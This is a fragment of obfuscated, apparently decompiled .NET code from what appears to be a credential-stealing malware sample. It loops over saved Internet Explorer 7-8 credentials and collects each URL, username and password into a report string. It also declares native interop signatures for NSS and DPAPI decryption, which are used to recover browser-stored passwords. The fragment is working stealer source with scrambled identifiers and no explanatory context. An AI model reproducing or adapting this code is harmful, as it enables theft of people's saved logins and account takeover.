        foreach (object obj in this.\u0037xPVmTE4aIw182)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(obj);
          if (Conversions.ToBoolean(Microsoft.VisualBasic.CompilerServices.Operators.NotObject(Microsoft.VisualBasic.CompilerServices.Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type) null, "Password", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "", false))))
          {
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "URL: "), NewLateBinding.LateGet(objectValue, (Type) null, "URL", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"));
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "Username: "), NewLateBinding.LateGet(objectValue, (Type) null, "UserName", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"));
            Left = Conversions.ToString(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) (Left + "Password: "), NewLateBinding.LateGet(objectValue, (Type) null, "Password", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) "\r\n"), (object) "\r\n"));
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, (string) null, false) != 0)
      Left = "--------------------------------------------------------------------------------------\r\n[ Internet Explorer 7-8 ]\r\n--------------------------------------------------------------------------------------\r\n" + Left + "\r\n";
    return Left;
  }

  public class \u0037xWk8AbCxps50
  {
    public static long cb;
    public static byte[] abID;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long EIOx7ah683654(long slot, bool loadCerts, long wincx);

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct M2f1MQdvUjA58
  {
    public int cbSize;
    public QgC2uUC6fwwZxChSLm3NbGFF49.sDk4GdQuVxX57 dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int m7DhemQCLmM55(
    IntPtr arenaOpt,
    IntPtr outItemOpt,
    StringBuilder inStr,
    int inLen);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int M8YR3jSqjUG56(
    ref QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 data,
    ref QgC2uUC6fwwZxChSLm3NbGFF49.O1oeJnX1EqK51 result,
    int cx);

  public struct O1oeJnX1EqK51
  {
    public int SECItemType;
    public int SECItemData;
    public int SECItemLen;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long qi2Tel0M2G152(string configdir);

  [Flags]
  public enum sDk4GdQuVxX57
  {
    CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
    CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long SpnF35Alw4X53();

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct SVGyg6YeIKb59
  {
    public int cbData;
    public IntPtr pbData;
  }
}
